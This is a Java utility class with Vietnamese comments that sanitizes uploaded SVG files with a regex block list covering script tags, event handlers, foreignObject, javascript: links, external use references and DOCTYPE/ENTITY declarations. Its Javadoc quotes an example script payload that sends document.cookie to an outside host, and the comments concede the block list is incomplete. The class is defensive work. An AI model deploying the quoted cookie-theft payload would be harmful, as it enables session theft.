package com.songnhue.core.common.util;

import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.regex.Pattern;

import com.songnhue.core.common.error.ErrorCode;
import com.songnhue.core.common.exception.ValidationException;

/**
 * Khử trùng tệp SVG trước khi lưu — điểm nghiệp vụ 7 (WS-14/T14.6).
 *
 * <h2>Vì sao SVG cần một lớp riêng, trong khi JPG/PNG thì không</h2>
 *
 * SVG <b>không phải ảnh</b> theo nghĩa của các định dạng còn lại — nó là XML, và đặc tả của nó cho
 * phép nhúng JavaScript. Một tệp {@code logo.svg} hợp lệ hoàn toàn có thể chứa
 * {@code <script>fetch('https://…?c='+document.cookie)</script>}, và trình duyệt sẽ chạy đoạn đó khi
 * ai đó mở thẳng tệp hoặc khi trang nhúng nó bằng {@code <object>}/{@code <embed>}.
 *
 * <p>{@link FileValidator} không giúp được ở đây: SVG là văn bản thuần, <b>không có magic bytes</b>.
 * {@link ImageSanitizer} cũng không — {@code javax.imageio} không đọc được SVG nên nó trả nguyên bản
 * về. Nghĩa là nếu không có lớp này, SVG đi thẳng từ biểu mẫu vào kho lưu trữ, <i>không qua một lớp
 * kiểm nào</i>.
 *
 * <h2>Phạm vi cho phép</h2>
 *
 * Chốt của dự án: SVG <b>chỉ nhận ở màn hình cấu hình giao diện</b> (logo, favicon — người tải là
 * Quản trị viên), và <b>không nhận trong thư viện media hay nội dung bài viết</b>. Lớp này là lớp
 * thứ hai, không phải lớp duy nhất: đường vào đã hẹp rồi mới tới khử trùng.
 *
 * <h2>Cách làm: danh sách chặn, và vì sao thế là đủ ở đây</h2>
 *
 * Danh sách chặn nói chung yếu hơn danh sách cho phép — luôn còn biến thể chưa nghĩ ra. Chấp nhận
 * được ở đây vì ba lý do cộng lại: người tải đã là Quản trị viên, số tệp đếm trên đầu ngón tay, và
 * <b>bất kỳ thứ gì lọt qua vẫn phải qua CSP của nginx</b> (WS-11/T11.5). Dựng bộ phân tích XML rồi
 * lọc theo danh sách thẻ cho phép là việc của lúc nào SVG được mở cho người dùng thường.
 */
public final class SvgSanitizer {

    private SvgSanitizer() {}

    public static final String MIME = "image/svg+xml";

    /**
     * Mẫu nguy hiểm, theo thứ tự từ hiển nhiên tới tinh vi.
     *
     * <p>{@code (?is)} = không phân biệt hoa thường + cho {@code .} khớp cả xuống dòng. Thiếu cờ thứ
     * hai thì một thẻ {@code <script>} viết tràn nhiều dòng lọt qua sạch sẽ.
     */
    private static final List<Pattern> NGUY_HIEM = List.of(
            // Thẻ script, kể cả khi không đóng đúng cách
            Pattern.compile("(?is)<\\s*script\\b.*?(</\\s*script\\s*>|$)"),
            // Mọi thuộc tính bắt sự kiện: onload, onclick, onmouseover, onerror…
            Pattern.compile("(?is)\\son[a-z]+\\s*=\\s*(\"[^\"]*\"|'[^']*'|[^\\s>]+)"),
            // <foreignObject> nhúng được HTML tuỳ ý vào giữa SVG
            Pattern.compile("(?is)<\\s*foreignObject\\b.*?(</\\s*foreignObject\\s*>|$)"),
            // Đường dẫn javascript: trong href/xlink:href
            Pattern.compile("(?is)(xlink:)?href\\s*=\\s*(\"|')?\\s*javascript:[^\"'>]*(\"|')?"),
            // <use xlink:href="http://…"> kéo nội dung từ máy chủ ngoài về
            Pattern.compile("(?is)<\\s*use\\b[^>]*(xlink:)?href\\s*=\\s*(\"|')\\s*https?:[^>]*>"),
            // <a> trong SVG bấm được, và đích của nó không kiểm soát được
            Pattern.compile("(?is)<\\s*(a|iframe|embed|object|handler|set|animate)\\b[^>]*>"),
            // Khai báo DOCTYPE mở đường cho tấn công thực thể XML (XXE, billion laughs)
            Pattern.compile("(?is)<!DOCTYPE[^>]*>"),
            Pattern.compile("(?is)<!ENTITY[^>]*>"));

    /**
     * Loại bỏ mọi phần có thể chạy mã.
     *
     * <p>Cắt bỏ chứ không từ chối cả tệp: một logo có thuộc tính {@code onload} thừa do phần mềm
     * thiết kế sinh ra vẫn là một logo dùng được, và bắt Quản trị viên tự đi tìm cách gỡ nó ra là
     * đẩy việc sang chỗ không ai làm được.
     *
     * @throws ValidationException {@code SYS-0003} khi nội dung không phải SVG
     */
    public static byte[] sanitize(byte[] content, String originalName) {
        if (content == null || content.length == 0) {
            throw (ValidationException)
                    new ValidationException(ErrorCode.SYS_0003).withDetail("file", "FILE_EMPTY", originalName);
        }
        String xml = new String(content, StandardCharsets.UTF_8);

        // Kiểm tối thiểu là có thẻ <svg>. SVG không có magic bytes nên đây là thứ gần nhất với việc
        // xác thực định dạng — đủ để chặn "đổi đuôi .svg cho một tệp bất kỳ".
        if (!Pattern.compile("(?is)<\\s*svg\\b").matcher(xml).find()) {
            throw (ValidationException)
                    new ValidationException(ErrorCode.SYS_0003).withDetail("file", "FILE_TYPE_NOT_ALLOWED", "not-svg");
        }

        String sach = xml;
        for (Pattern mau : NGUY_HIEM) {
            sach = mau.matcher(sach).replaceAll("");
        }
        return sach.getBytes(StandardCharsets.UTF_8);
    }

    /** Nội dung này có còn phần chạy được không — dùng cho bài kiểm và cho log cảnh báo. */
    public static boolean coMaChayDuoc(byte[] content) {
        String xml = new String(content, StandardCharsets.UTF_8);
        return NGUY_HIEM.stream().anyMatch(mau -> mau.matcher(xml).find());
    }
}
